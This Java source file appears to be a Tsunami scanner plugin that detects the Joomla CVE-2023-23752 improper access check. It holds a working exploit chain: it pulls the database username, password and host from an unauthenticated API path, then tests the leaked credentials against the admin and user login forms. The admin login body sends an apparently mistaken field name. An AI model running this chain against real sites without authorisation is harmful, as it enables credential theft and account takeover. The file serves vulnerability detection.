/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202323752;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.*;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionReportList.Builder;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.UnknownHostException;
import java.net.http.HttpRequest;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;
import org.json.JSONArray;
import org.json.JSONObject;

/** A {@link VulnDetector} that detects the CVE-2023-23752 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202323752VulnDetector",
    version = "0.1",
    description =
        "CVE-2023-23752: An improper access check allows unauthorized access to webservice"
            + " endpoints",
    author = "Amammad",
    bootstrapModule = Cve202323752DetectorBootstrapModule.class)
public final class Cve202323752VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting
  static final String VULNERABLE_PATH = "api/index.php/v1/config/application?public=true";

  @VisibleForTesting static final String DETECTION_STRING_1 = "password";
  @VisibleForTesting static final String DETECTION_STRING_2 = "user";
  @VisibleForTesting static final String DETECTION_STRING_BY_HEADER_1 = "application/json";
  @VisibleForTesting static final String DETECTION_STRING_BY_HEADER_2 = "application/vnd.api+json";
  @VisibleForTesting static final int DETECTION_STRING_BY_STATUS = HttpStatus.OK.code();
  private final HttpClient httpClient;
  private final Clock utcClock;
  //  private JSONObject ResponseBodyJson;

  @Inject
  Cve202323752VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  static final class ScanResults {
    private String DataBaseUsername;
    private String DataBasePassword;
    private String DataBaseHost;
    private boolean IsPublicDataBaseHost;
    private boolean CompromisedAdminAccount;
    private boolean CompromisedUserAccount;
    private boolean IsSuccessFul;

    public ScanResults(
        String DataBaseUsername,
        String DataBasePassword,
        String DataBaseHost,
        boolean IsPublicDataBaseHost,
        boolean CompromisedAdminAccount,
        boolean CompromisedUserAccount,
        boolean IsSuccessFul) {
      this.DataBaseUsername = DataBaseUsername;
      this.DataBasePassword = DataBasePassword;
      this.DataBaseHost = DataBaseHost;
      this.IsPublicDataBaseHost = IsPublicDataBaseHost;
      this.CompromisedUserAccount = CompromisedUserAccount;
      this.CompromisedAdminAccount = CompromisedAdminAccount;
      this.IsSuccessFul = IsSuccessFul;
    }
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-23752 starts detecting.");

    Builder detectionReport = DetectionReportList.newBuilder();
    matchedServices.stream()
        .filter(NetworkServiceUtils::isWebService)
        .forEach(
            networkService -> {
              ScanResults Results = isServiceVulnerable(networkService);
              if (Results.IsSuccessFul) {
                detectionReport.addDetectionReports(
                    buildDetectionReport(targetInfo, networkService, Results));
              }
            });
    return detectionReport.build();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService, ScanResults Results) {
    StringBuilder ScanResultReport = new StringBuilder();
    ScanResultReport.append("The leaked credentials are: \n")
        .append("Database Password:\n")
        .append(Results.DataBasePassword)
        .append("\n")
        .append("Database UserName:\n")
        .append(Results.DataBaseUsername)
        .append("\n");

    if (Results.IsPublicDataBaseHost) {
      ScanResultReport.append(
              "The dataBase host is Accessible to Public Because it has a public IP address, "
                  + "Attackers can leverage leaked DataBase credentials to login into your DataBase, The DataBase HostName is: ")
          .append(Results.DataBaseHost)
          .append("\n");
    }

    if (Results.CompromisedAdminAccount) {
      ScanResultReport.append(
              "Scanner has checked the credentials against Administrator login page "
                  + "and Leaked credentials had used as a Joomla Administrator credentials")
          .append("\n");
    }

    if (Results.CompromisedUserAccount) {
      ScanResultReport.append(
              "Scanner has checked the credentials against Users login page "
                  + "and Leaked credentials had used as a Joomla User credentials")
          .append("\n");
    }

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_23752"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Joomla unauthorized access to webservice endpoints")
                .setDescription(
                    "CVE-2023-23752: An improper access check allows unauthorized access to"
                        + " webservice endpoints. attacker can get critical information of database and webserver like passwords by this vulnerability")
                .setRecommendation("Upgrade to version 4.2.8 and higher")
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(TextData.newBuilder().setText(ScanResultReport.toString()))))
        .build();
  }

  private ScanResults isServiceVulnerable(NetworkService networkService) {
    ScanResults Results = new ScanResults("", "", "", false, false, false, false);
    HttpHeaders httpHeaders =
        HttpHeaders.builder()
            .addHeader(CONTENT_TYPE, "text/plain; charset=UTF-8")
            .addHeader(
                ACCEPT,
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            .addHeader(UPGRADE_INSECURE_REQUESTS, "1")
            .addHeader(ACCEPT_LANGUAGE, "Accept-Language: en-US,en;q=0.5")
            .addHeader(ACCEPT_ENCODING, "gzip, deflate")
            .build();

    String targetVulnerabilityUrl = buildTarget(networkService).append(VULNERABLE_PATH).toString();
    try {
      HttpResponse httpResponse =
          httpClient.send(
              get(targetVulnerabilityUrl).setHeaders(httpHeaders).build(), networkService);

      // immediate checks for faster scanning
      if (httpResponse.status().code() != DETECTION_STRING_BY_STATUS
          || httpResponse.bodyString().isEmpty()) {
        return Results;
      }

      // check for content-type existence and get the value of them
      String ContentTypeValue = "";
      if (httpResponse.headers().get(CONTENT_TYPE.toLowerCase()).isPresent()) {
        ContentTypeValue =
            Objects.requireNonNull(httpResponse.headers().get("Content-Type").toString());

      } else if (httpResponse.headers().get(CONTENT_TYPE).isPresent()) {
        ContentTypeValue =
            Objects.requireNonNull(httpResponse.headers().get("Content-Type").toString());
      } else {
        return Results;
      }

      // check for content-type header's value matches our detection rules
      if (!ContentTypeValue.contains(DETECTION_STRING_BY_HEADER_1)
          && !ContentTypeValue.contains(DETECTION_STRING_BY_HEADER_2)) {
        return Results;
      }

      // check for body values match our detection rules
      // and save leaked credentials
      if (httpResponse.bodyString().get().contains(DETECTION_STRING_1)
          && httpResponse.bodyString().get().contains(DETECTION_STRING_2)) {
        Results.IsSuccessFul = true;

        JSONObject ResponseBodyJson = new JSONObject(httpResponse.bodyString().get());
        if (ResponseBodyJson.keySet().contains("data")) {
          JSONArray jsonArray = ResponseBodyJson.getJSONArray("data");
          for (int i = 0; i < jsonArray.length(); i++) {
            if (jsonArray.getJSONObject(i).keySet().contains("attributes")) {
              JSONObject tmp =
                  new JSONObject(jsonArray.getJSONObject(i).get("attributes").toString());
              if (tmp.keySet().contains(("user"))) {
                Results.DataBaseUsername = tmp.get("user").toString();
              }
              if (tmp.keySet().contains(("password"))) {
                Results.DataBasePassword = tmp.get("password").toString();
              }
              if (tmp.keySet().contains(("host"))) {
                Results.DataBaseHost = tmp.get("host").toString();
                Results.IsPublicDataBaseHost = IsPublicHost(tmp.get("host").toString());
              }
            }
          }
        }

        //         Check leaked Credentials if administrator has used them in some other entries
        if (!Results.DataBaseUsername.isEmpty() && !Results.DataBasePassword.isEmpty()) {
          Results.CompromisedAdminAccount =
              checkJoomlaAdminsLogin(
                  buildTarget(networkService), Results.DataBaseUsername, Results.DataBasePassword);
          Results.CompromisedUserAccount =
              checkJoomlaUsersLogin(
                  buildTarget(networkService), Results.DataBaseUsername, Results.DataBasePassword);
        }

        return Results;
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return Results;
    } catch (InterruptedException e) {
      throw new RuntimeException(e);
    }
    return Results;
  }

  public static boolean checkJoomlaAdminsLogin(
      StringBuilder url, String DataBaseUsername, String DataBasePassword)
      throws IOException, InterruptedException {
    return checkJoomlaLogin(
        url + "administrator/",
        url + "administrator/index.php",
        "DataBaseUsername="
            + DataBaseUsername
            + "&passwd="
            + DataBasePassword
            + "&option=com_login&task=login",
        "Set-Cookie");
    //    java.net.http.HttpClient httpClient =
    //        java.net.http.HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(2)).build();
    //    HttpRequest request =
    //        HttpRequest.newBuilder()
    //            .GET()
    //            .uri(URI.create(url.toString() + "administrator/index.php"))
    //            .setHeader(
    //                ACCEPT,
    //
    // "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    //            .setHeader(
    //                "User-Agent",
    //                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
    // Gecko) Chrome/111.0.5563.65 Safari/537.36")
    //            .setHeader("Cache-Control", "max-age=0")
    //            .build();
    //    java.net.http.HttpResponse<String> httpResponse =
    //        httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());
    //
    //    // get value of hidden parameter named return
    //    String ReturnToken = null;
    //    Pattern ReturnTokenPattern =
    //        Pattern.compile("<input type=\"hidden\" name=\"return\" value=\"(.+?)\">");
    //    Matcher matcher = ReturnTokenPattern.matcher(httpResponse.body());
    //    if (matcher.find()) {
    //      ReturnToken = matcher.group(1);
    //
    //    } else return false;
    //
    //    // get CSRF token
    //    String CsrfToken = null;
    //    Pattern CsrfPattern = Pattern.compile("<input type=\"hidden\" name=\"(.+?)\"
    // value=\"1\">");
    //    matcher = CsrfPattern.matcher(httpResponse.body());
    //    if (matcher.find()) {
    //      CsrfToken = matcher.group(1);
    //    } else return false;
    //
    //    // get PreAuth Cookies
    //    String Cookies = String.valueOf(httpResponse.headers().firstValue("Set-Cookie"));
    //
    //    request =
    //        HttpRequest.newBuilder()
    //            .POST(
    //                HttpRequest.BodyPublishers.ofString(
    //                    "username="
    //                        + DataBaseUsername
    //                        + "&passwd="
    //                        + DataBasePassword
    //                        + "&option=com_login&task=login"
    //                        + "&return="
    //                        + ReturnToken
    //                        + "&"
    //                        + CsrfToken
    //                        + "=1"))
    //            .uri(URI.create(url.toString() + "administrator/index.php"))
    //            .setHeader(
    //                ACCEPT,
    //
    // "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    //            .setHeader(
    //                "User-Agent",
    //                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
    // Gecko) Chrome/111.0.5563.65 Safari/537.36")
    //            .setHeader("Cache-Control", "max-age=0")
    //            .setHeader("Cookie", Cookies)
    //            .setHeader("Content-Type", "application/x-www-form-urlencoded")
    //            .build();
    //    httpResponse = httpClient.send(request,
    // java.net.http.HttpResponse.BodyHandlers.ofString());
    //
    //    return httpResponse.headers().toString().contains("Set-Cookie")
    //        || httpResponse.headers().toString().contains("Set-Cookie".toLowerCase());
  }

  public static boolean checkJoomlaUsersLogin(
      StringBuilder url, String DataBaseUsername, String DataBasePassword)
      throws IOException, InterruptedException {
    return checkJoomlaLogin(
        url.toString(),
        url.append("index.php").toString(),
        "username="
            + DataBaseUsername
            + "&password="
            + DataBasePassword
            + "&Submit=&option=com_users&task=user.login",
        "joomla_user_state=logged_in;");

    //    java.net.http.HttpClient httpClient =
    //        java.net.http.HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(2)).build();
    //    HttpRequest request =
    //        HttpRequest.newBuilder()
    //            .GET()
    //            .uri(URI.create(url.toString()))
    //            .setHeader(
    //                ACCEPT,
    //
    // "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    //            .setHeader(
    //                "User-Agent",
    //                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
    // Gecko) Chrome/111.0.5563.65 Safari/537.36")
    //            .setHeader("Cache-Control", "max-age=0")
    //            .build();
    //    java.net.http.HttpResponse<String> httpResponse =
    //        httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());
    //
    //    // get some hidden parameter values
    //    String ReturnToken = null;
    //    Pattern ReturnTokenPattern =
    //        Pattern.compile("<input type=\"hidden\" name=\"return\" value=\"(.+?)\">");
    //    Matcher matcher = ReturnTokenPattern.matcher(httpResponse.body());
    //    if (matcher.find()) {
    //      ReturnToken = matcher.group(1);
    //    } else return false;
    //
    //    // get CSRF token method 1
    //    String CsrfToken = null;
    //    Pattern CsrfPattern = Pattern.compile("<input type=\"hidden\" name=\"(.+?)\"
    // value=\"1\">");
    //    matcher = CsrfPattern.matcher(httpResponse.body());
    //    if (matcher.find()) {
    //      CsrfToken = matcher.group(1);
    //    } else return false;
    //
    //    //    // get CSRF token method 2
    //    //    String CsrfToken=null;
    //    //    Pattern CsrfPattern =
    //    //        Pattern.compile(
    //    //            "<script type=\"application/json\" class=\"joomla-script-options
    //    // new\">(.+)</script>");
    //    //    matcher = CsrfPattern.matcher(httpResponse.body());
    //    //    if (matcher.find()) {
    //    //      CsrfToken = new JSONObject(matcher.group(1)).get("csrf.token").toString();
    //    //     } else return false;
    //
    //    // get PreAuth Cookies
    //    String Cookies = String.valueOf(httpResponse.headers().firstValue("Set-Cookie"));
    //
    //    request =
    //        HttpRequest.newBuilder()
    //            .POST(
    //                HttpRequest.BodyPublishers.ofString(
    //                    "username="
    //                        + DataBaseUsername
    //                        + "&password="
    //                        + DataBasePassword
    //                        + "&Submit=&option=com_users&task=user.login&return="
    //                        + ReturnToken
    //                        + "&"
    //                        + CsrfToken
    //                        + "=1"))
    //            .uri(URI.create(url.append("index.php").toString()))
    //            .setHeader(
    //                ACCEPT,
    //
    // "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    //            .setHeader(
    //                "User-Agent",
    //                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
    // Gecko) Chrome/111.0.5563.65 Safari/537.36")
    //            .setHeader("Cache-Control", "max-age=0")
    //            .setHeader("Cookie", Cookies)
    //            .setHeader("Content-Type", "application/x-www-form-urlencoded")
    //            .build();
    //    httpResponse = httpClient.send(request,
    // java.net.http.HttpResponse.BodyHandlers.ofString());
    //    return httpResponse.headers().toString().contains("joomla_user_state=logged_in;");
  }

  public static boolean checkJoomlaLogin(
      String InitialUrl, String LoginUrl, String Body, String FinalResponseMatcher)
      throws IOException, InterruptedException {

    java.net.http.HttpClient httpClient =
        java.net.http.HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(2)).build();
    HttpRequest request =
        HttpRequest.newBuilder()
            .GET()
            .uri(URI.create(InitialUrl))
            .setHeader(
                ACCEPT,
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            .setHeader(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36")
            .setHeader("Cache-Control", "max-age=0")
            .build();
    java.net.http.HttpResponse<String> httpResponse =
        httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());

    // get some hidden parameter values
    String ReturnToken = null;
    Pattern ReturnTokenPattern =
        Pattern.compile("<input type=\"hidden\" name=\"return\" value=\"(.+?)\">");
    Matcher matcher = ReturnTokenPattern.matcher(httpResponse.body());
    if (matcher.find()) {
      ReturnToken = matcher.group(1);
    } else return false;

    // get CSRF token method 1
    String CsrfToken = null;
    Pattern CsrfPattern = Pattern.compile("<input type=\"hidden\" name=\"(.+?)\" value=\"1\">");
    matcher = CsrfPattern.matcher(httpResponse.body());
    if (matcher.find()) {
      CsrfToken = matcher.group(1);
    } else return false;

    //    // get CSRF token method 2
    //    String CsrfToken=null;
    //    Pattern CsrfPattern =
    //        Pattern.compile(
    //            "<script type=\"application/json\" class=\"joomla-script-options
    // new\">(.+)</script>");
    //    matcher = CsrfPattern.matcher(httpResponse.body());
    //    if (matcher.find()) {
    //      CsrfToken = new JSONObject(matcher.group(1)).get("csrf.token").toString();
    //     } else return false;

    // get PreAuth Cookies
    String Cookies = String.valueOf(httpResponse.headers().firstValue("Set-Cookie"));

    request =
        HttpRequest.newBuilder()
            .POST(
                HttpRequest.BodyPublishers.ofString(
                    Body + "&return=" + ReturnToken + "&" + CsrfToken + "=1"))
            .uri(URI.create(LoginUrl))
            .setHeader(
                ACCEPT,
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            .setHeader(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36")
            .setHeader("Cache-Control", "max-age=0")
            .setHeader("Cookie", Cookies)
            .setHeader("Content-Type", "application/x-www-form-urlencoded")
            .build();
    httpResponse = httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());

    logger.atInfo().log(
        "================" + httpResponse.headers().toString() + "========================");
    return httpResponse.headers().toString().contains(FinalResponseMatcher)
        || httpResponse.headers().toString().contains(FinalResponseMatcher.toLowerCase());
  }

  public static boolean IsPublicHost(String url) {
    if (url != null) {
      if (!url.contains(".")) {
        return false;
      }
      try {
        InetAddress address = null;
        String host = "";
        String hostAddress = "";
        if (url.contains(":")) {
          // It is a URL and has protocol/scheme (https/http)
          URL parsedUrl = new URL(url);
          host = parsedUrl.getHost();
          address = InetAddress.getByName(host);
        } else {
          // it isn't a URL and only contains hostname
          address = InetAddress.getByName(url);
        }
        hostAddress = address.getHostAddress();
        host = host.toLowerCase();

        return !address.isAnyLocalAddress()
            && !address.isLoopbackAddress()
            && !address.isLinkLocalAddress()
            && !host.endsWith(".internal") // Redundant
            && !host.endsWith(".local") // Redundant
            && !host.contains("localhost") // Redundant
            && !hostAddress.startsWith("0.") // 0.0.0.0/8
            && !hostAddress.startsWith("10.") // 10.0.0.0/8
            && !hostAddress.startsWith("127.") // 127.0.0.0/8
            && !hostAddress.startsWith("169.254.") // 169.254.0.0/16
            && !hostAddress.startsWith("172.16.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.17.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.18.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.19.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.20.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.21.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.22.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.23.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.24.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.25.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.26.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.27.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.28.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.29.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.30.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.31.") // 172.16.0.0/12
            && !hostAddress.startsWith("192.0.0.") // 192.0.0.0/24
            && !hostAddress.startsWith("192.168.") // 192.168.0.0/16
            && !hostAddress.startsWith("198.18.") // 198.18.0.0/15
            && !hostAddress.startsWith("198.19.") // 198.18.0.0/15
            && !hostAddress.startsWith("fc00::") // fc00::/7
            // https://stackoverflow.com/questions/53764109/is-there-a-java-api-that-will-identify-the-ipv6-address-fd00-as-local-private
            && !hostAddress.startsWith("fd00::") // fd00::/8
            && !host.endsWith(".arpa"); // reverse domain (needed?)
      } catch (MalformedURLException | UnknownHostException e) {
        return false;
      }
    } else {
      return false;
    }
  }
}
